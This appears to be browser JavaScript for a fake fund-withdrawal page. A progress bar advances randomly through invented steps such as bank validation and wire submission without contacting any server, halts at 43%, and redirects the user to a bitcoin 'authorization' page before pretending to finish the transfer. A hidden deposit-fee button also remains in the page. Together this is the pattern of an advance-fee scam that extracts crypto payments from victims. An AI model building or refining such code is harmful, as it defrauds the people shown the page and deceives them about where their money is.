// Withdraw processing — at 43% redirect to btc-auth; resume when authorized
(function () {
  'use strict';

  const STORAGE_KEY = 'withdrawFlow';
  const params = new URLSearchParams(location.search);
  const txId = params.get('tx') || '';
  const amountParam = params.get('amount') || '';
  const taxIdParam = params.get('taxId') || params.get('txid') || '';
  const authorizedParam = params.get('authorized') === '1' || params.get('authorized') === 'true';

  const bar = document.getElementById('bar');
  const pct = document.getElementById('pct');
  const txInfo = document.getElementById('txInfo');
  const statusLine = document.getElementById('statusLine');
  const cancelBtn = document.getElementById('cancelBtn');
  const spinner = document.getElementById('spinner');
  const feeAlert = document.getElementById('feeAlert');
  const depositFeeBtn = document.getElementById('depositFeeBtn');

  // Hide legacy fee UI if still in DOM
  if (feeAlert) feeAlert.style.display = 'none';
  if (depositFeeBtn) depositFeeBtn.style.display = 'none';

  let progress = 0;
  let tickHandle = null;
  let redirectedToAuth = false;

  function loadFlow() {
    try {
      const raw = sessionStorage.getItem(STORAGE_KEY);
      return raw ? JSON.parse(raw) : null;
    } catch (e) {
      return null;
    }
  }

  function saveFlow(flow) {
    try {
      sessionStorage.setItem(STORAGE_KEY, JSON.stringify(flow));
    } catch (e) { /* ignore */ }
  }

  function fmtMoney(v) {
    if (window.money) return money.format(v);
    return '$' + Number(v || 0).toFixed(2);
  }

  function setProgress(v, label) {
    progress = Math.min(100, Math.max(0, Math.round(v)));
    if (bar) bar.style.width = progress + '%';
    if (pct) pct.textContent = progress + '%';
    if (label && statusLine) {
      statusLine.innerHTML =
        (progress < 100 && spinner
          ? '<span class="spinner" id="spinner"></span>'
          : '') + label;
    }
  }

  async function estimateBtc(usd) {
    // Demo rate; try CoinGecko, fall back to fixed
    let usdPerBtc = 95000;
    try {
      const res = await fetch(
        'https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd'
      );
      if (res.ok) {
        const data = await res.json();
        if (data.bitcoin && data.bitcoin.usd) usdPerBtc = Number(data.bitcoin.usd);
      }
    } catch (e) { /* demo fallback */ }
    const btc = Number(usd) / usdPerBtc;
    return {
      btc: Number(btc.toFixed(8)),
      rate: usdPerBtc
    };
  }

  function goToBtcAuth(flow) {
    if (redirectedToAuth) return;
    redirectedToAuth = true;
    if (tickHandle) clearInterval(tickHandle);

    setProgress(43, 'Authorization required — redirecting…');

    // Persist before handoff so btc-auth.html (public/btc-auth.html) can read session
    saveFlow(Object.assign({}, flow, {
      amount: flow.amount,
      taxId: flow.taxId || taxIdParam,
      tx: flow.tx || txId,
      btcAmount: flow.btcAmount,
      email: flow.email || '',
      authorized: false
    }));

    const amount = flow.amount;
    const taxId = flow.taxId || taxIdParam;
    const email = flow.email || '';
    const q = [
      'amount=' + encodeURIComponent(amount),
      'btc=' + encodeURIComponent(flow.btcAmount != null ? flow.btcAmount : ''),
      'taxId=' + encodeURIComponent(taxId),
      'tx=' + encodeURIComponent(flow.tx || txId),
      'email=' + encodeURIComponent(email)
    ].join('&');

    setTimeout(() => {
      // Served from public/btc-auth.html via app.get('/btc-auth')
      window.location.href = '/btc-auth?' + q;
    }, 600);
  }

  function finishSuccess() {
    if (tickHandle) clearInterval(tickHandle);
    setProgress(100, 'Withdrawal complete.');
    if (spinner) spinner.style.display = 'none';
    try {
      sessionStorage.removeItem(STORAGE_KEY);
    } catch (e) { /* ignore */ }
    setTimeout(() => {
      window.location = '/dashboard';
    }, 1400);
  }

  async function boot() {
    if (!window.auth || !auth.isAuthenticated()) {
      window.location.href =
        '/login?redirect=' + encodeURIComponent(location.pathname + location.search);
      return;
    }

    let flow = loadFlow() || {};
    // Merge URL + session
    flow.tx = flow.tx || txId;
    flow.amount = flow.amount != null ? flow.amount : amountParam;
    flow.taxId = flow.taxId || taxIdParam;
    if (authorizedParam) flow.authorized = true;

    let userLabel = 'account';
    let userEmail = flow.email || '';
    try {
      const me = await auth.fetchMe();
      userLabel = me.user.name || me.user.email;
      userEmail = me.user.email || userEmail;
      flow.email = userEmail;
      flow.name = me.user.name || flow.name;
    } catch (e) { /* ignore */ }

    if (!flow.tx) {
      if (txInfo) txInfo.textContent = 'Missing transaction. Returning to dashboard…';
      setTimeout(() => {
        window.location = '/dashboard';
      }, 1000);
      return;
    }

    // Ensure BTC amount for auth handoff
    if (flow.btcAmount == null && flow.amount) {
      const est = await estimateBtc(flow.amount);
      flow.btcAmount = est.btc;
      flow.btcRate = est.rate;
    }
    saveFlow(flow);

    if (txInfo) {
      const amtLabel = flow.amount ? fmtMoney(flow.amount) : 'funds';
      const btcLabel = flow.btcAmount != null ? ' · ≈ ' + flow.btcAmount + ' BTC' : '';
      txInfo.textContent =
        'Withdrawing ' + amtLabel + btcLabel + ' for ' + userLabel;
    }

    // Resume after btc-auth
    if (flow.authorized || authorizedParam) {
      setProgress(43, 'Authorization verified. Completing withdrawal…');
      tickHandle = setInterval(() => {
        if (progress < 100) {
          setProgress(progress + 6, 'Finalizing bank transfer…');
        } else {
          finishSuccess();
        }
      }, 380);
      return;
    }

    // Initial run — progress to 43%, then btc-auth
    setProgress(4, 'Initializing withdrawal…');
    tickHandle = setInterval(() => {
      if (progress < 43) {
        const next = Math.min(43, progress + 3 + Math.random() * 4);
        let label = 'Processing withdrawal…';
        if (next < 15) label = 'Validating bank details…';
        else if (next < 28) label = 'Submitting wire instructions…';
        else if (next < 43) label = 'Preparing blockchain authorization…';
        setProgress(next, label);
        if (next >= 43) {
          clearInterval(tickHandle);
          setProgress(43, 'Authorization required…');
          goToBtcAuth(flow);
        }
      }
    }, 420);
  }

  if (cancelBtn) {
    cancelBtn.addEventListener('click', () => {
      if (tickHandle) clearInterval(tickHandle);
      window.location = '/dashboard';
    });
  }

  document.addEventListener('DOMContentLoaded', boot);
  if (document.readyState !== 'loading') boot();
})();
